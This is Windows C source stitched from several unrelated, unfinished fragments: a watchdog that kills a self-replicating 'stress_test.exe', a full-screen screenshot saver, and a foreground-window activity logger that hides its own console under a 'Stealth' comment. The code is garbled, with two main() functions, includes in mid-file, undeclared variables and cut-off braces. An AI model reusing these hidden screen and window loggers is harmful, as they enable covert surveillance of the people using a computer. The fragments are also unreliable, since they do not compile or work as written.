#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

void kill_processes(const char* process_name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            if (strcmp(pe.szExeFile, process_name) == 0) {
                HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                }
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

int count_processes(const char* process_name) {
    int count = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            if (strcmp(pe.szExeFile, process_name) == 0) {
                count++;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return count;
}

int main() {
    const char* target = "stress_test.exe"; // Make sure this matches your replicator name
    int threshold = 10;

    printf("Watchdog active. Monitoring for %s...\n", target);

    while (1) {
        int current_instances = count_processes(target);
        
        if (current_instances >= threshold) {
            printf("Threshold reached (%d). Cleaning system...\n", current_instances);
            kill_processes(target);
        }

        Sleep(2000); // Check every 2 seconds
    }
    return 0;
}

void SaveScreenshot(int count) {
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDest = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x, y);
    SelectObject(hDest, hBitmap);
    BitBlt(hDest, 0, 0, x, y, hScreen, 0, 0, SRCCOPY);

    BITMAP btm;
    PBITMAPINFO pbmi;
    WORD clrBits;

    GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&btm);
    clrBits = (WORD)(btm.bmPlanes * btm.bmBitsPixel);
    if (clrBits == 1) clrBits = 1;
    else if (clrBits <= 4) clrBits = 4;
    else if (clrBits <= 8) clrBits = 8;
    else if (clrBits <= 16) clrBits = 16;
    else if (clrBits <= 24) clrBits = 24;
    else clrBits = 32;

    pbih->biSize = sizeof(BITMAPINFOHEADER);
    pbih->biWidth = btm.bmWidth;
    pbih->biHeight = btm.bmHeight;
    pbih->biPlanes = btm.bmPlanes;
    pbih->biBitCount = btm.bmBitsPixel;
    pbih->biCompression = BI_RGB;

    sprintf(filename, "boot_snap_%d.bmp", count);

#include <stdio.h>
#include <time.h>
#include <shlobj.h>

// Function to log data to the text file
void log_duration(const char* title, double seconds) {
    char log_path[MAX_PATH];
    GetModuleFileName(NULL, log_path, MAX_PATH);
    char *last_slash = strrchr(log_path, '\\');
    if (last_slash) *(last_slash + 1) = '\0';
    strcat(log_path, "usage_report.txt");

    FILE *file = fopen(log_path, "a");
    if (file) {
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        
        // Convert seconds to minutes/seconds for readability
        int mins = (int)seconds / 60;
        int secs = (int)seconds % 60;

        fprintf(file, "[%02d:%02d:%02d] Window: %-30s | Duration: %dm %ds\n", 
                t->tm_hour, t->tm_min, t->tm_sec, title, mins, secs);
        fclose(file);
    }
}

int main() {
    // Stealth: Hide the console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    char last_title[MAX_PATH] = "";

    time_t start_time = time(NULL);

    while (1) {
        HWND handle = GetForegroundWindow();

                start_time = time(NULL);
            }

    }
